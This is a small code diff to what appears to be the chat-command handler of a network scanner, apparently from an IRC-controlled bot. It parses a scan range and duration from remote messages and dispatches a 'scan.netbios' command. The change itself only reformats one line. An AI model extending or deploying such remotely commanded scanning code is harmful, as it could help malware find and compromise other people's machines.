@@ -74,7 +74,8 @@ bool CScanner::HandleCommand(CMessage *pMsg)
         g_cMainCtrl.m_cConsDbg.Log(10, "File =%s:Line=%d:Function=%s \n",__FILE__, __LINE__, __FUNCTION__);
         g_cMainCtrl.m_cConsDbg.Log(10, "*%s* %s  \n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
 #endif
-    CString sRange(pMsg->sChatString.Token(1, " ")); int iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
+    CString sRange(pMsg->sChatString.Token(1, " "));
+    int iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
 
 #ifdef WIN32
 	if(!pMsg->sCmd.Compare("scan.netbios"))
